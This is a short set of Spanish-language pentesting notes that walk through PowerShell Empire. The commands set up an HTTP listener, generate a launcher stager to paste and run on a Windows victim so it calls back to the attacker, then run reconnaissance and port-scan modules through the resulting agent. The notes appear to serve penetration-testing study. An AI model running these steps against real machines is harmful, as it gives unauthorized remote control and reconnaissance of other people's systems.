# Powershell Pentesters

Tags: #Powershell #PSEmpire 

## Powershell Empire  

```bash 
# Esto funciona para una maquina victima 'Windows' donde tenemos acceso   

❯ powershell-empire server                      # Inicializamos el servidor 
❯ powershell-empire client                      # Iniciamos el PS-Empire cliente

# Comandos dentro de Powershell Empire 'Client' para establecer sesion con el primer host
❯ uselistener http                              # Usaremos este listener y lo configuraremos con la maquina de atacante
	❯ set Port 8888
	❯ set Host <IP>
	❯ execute
	❯ listeners                                # Miramos los 'listeners' configurados y que se esta ejecutando 
	❯ main                                     # Regresamos a la pagina principal 
	
❯ usestager multi/launcher                      # Configuraremos el 'stager' 
	❯ set Listener http                        # Agregamos el 'listener' anteriormente creado 
	❯ execute                                  # Nos regresara codigo en PS el cual debemos de copiarlo, pegarlo y ejecutarlo en la maquina victima para que haga la conexion a nuestro PS-Empire
	❯ agents                                   # Miramos los 'agents' o conexiones en nuestro PS-Empire

❯ interat <AgentName>                           # Iniciar la interaccion con el 'Agent'
	❯ usemodule powershell/situational_awareness/host/computerdetails 
		❯ execute 

	❯ usemodule powershell/situational_awareness/network/portscan 
		❯ set Hosts <IP>                      # Colocamos la IP de la maquina victima 
		❯ execute
```